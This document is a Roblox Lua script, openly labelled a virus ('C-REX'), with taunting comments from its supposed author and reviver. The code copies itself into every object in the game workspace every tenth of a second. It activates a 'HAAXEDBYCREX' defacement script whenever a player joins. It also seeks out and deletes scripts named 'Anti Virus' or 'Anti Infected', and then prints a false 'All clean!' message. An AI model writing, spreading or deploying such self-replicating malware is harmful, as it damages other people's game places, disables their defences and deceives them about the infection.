-- C-REX (VIRUS, main)
-- revived by ugh (@pinn1s github), 7th august 2025
-- WARNING: this script is a virus. youve been warned.
-- NOTE: this script is revived on the day before it was removed.

function spread() -- Made by C-Rex and only c-rex. similar scripts are copies
-- I de storied your place!
-- Come get me if u dare, I'll pwn u ROFLROFLLOLOL!
-- Creaturesaurus Rex
-- Discord: C-Rex#2122
-- if you call me fat i'l end you, no joke
local stuff = game.Workspace:GetChildren()
for i = 1, #stuff do	
if (stuff[i].className ~= "Script") and (stuff[i]:findFirstChild("C-REX") == nil) and (stuff[i].className ~= "Camera") then
local clone = script:clone()
clone.Parent = stuff[i]
end
end
end

function onPlayerEntered(newPlayer)	
while true do
			if newPlayer.Character ~= nil then break end
			wait(1)
end
	hehe = game.Workspace:FindFirstChild("HAAXEDBYCREX")
	if hehe == nil then	
	local pwned = script.HAAXEDBYCREX:clone()
	pwned.Parent = game.Workspace
	pwned.Disabled = false
	end
	end
game.Players.PlayerAdded:connect(onPlayerEntered)

while true do
wait(.1)
spread()
end

function GetAllItems(mdl) 
local objs = {} 
function Search(obj) 
if obj~=workspace then 
table.insert(objs,obj) 
end 
if #obj:GetChildren() > 0 then 
for i, v in ipairs(obj:GetChildren()) do 
Search(v) 
end 
end 
end 
Search(mdl) 
return objs 
end 



for i, v in ipairs(GetAllItems(workspace)) do 
if v.className == "Script" then 
if v.Name == "Script" or v.Name == "Anti Infected" or v.Name == "Anti Virus" or v.Name == "lololyougothackedNOOB" then 
v.Parent = game.Lighting --Just in case it has an ANTI FAT BIAS >:(((((((( 
t = Instance.new("ObjectValue") 
t.Name = "IsAVirus" 
t.Parent = v 
end 
end 
end 

for i, v in ipairs(game.Lighting:GetChildren()) do 
if v:findFirstChild("IsAVirus") then --Only remove YOU AFTER YOU CALL ME FAT D:<
v:remove() 
end 
end 



print("ANTI FAT BIGAATZ debugged! All clean!")
